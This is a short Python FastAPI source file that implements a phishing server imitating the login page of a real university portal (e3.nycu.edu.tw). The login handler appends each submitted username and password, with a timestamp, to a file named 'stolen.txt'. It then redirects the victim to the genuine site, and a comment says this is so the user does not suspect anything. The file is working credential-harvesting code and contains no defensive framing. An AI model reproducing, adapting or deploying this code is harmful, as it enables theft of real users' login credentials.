import os
from datetime import datetime

from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates

app = FastAPI()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

STOLEN_FILE = os.path.join(BASE_DIR, "..", "stolen.txt")
REAL_SITE = "https://e3.nycu.edu.tw/"


@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.post("/login")
async def handle_login(
    username: str = Form(...),
    password: str = Form(...),
):
    # Save stolen credentials
    with open(STOLEN_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] username={username} password={password}\n")

    # Redirect to real site so user doesn't suspect anything
    return RedirectResponse(url=REAL_SITE, status_code=302)
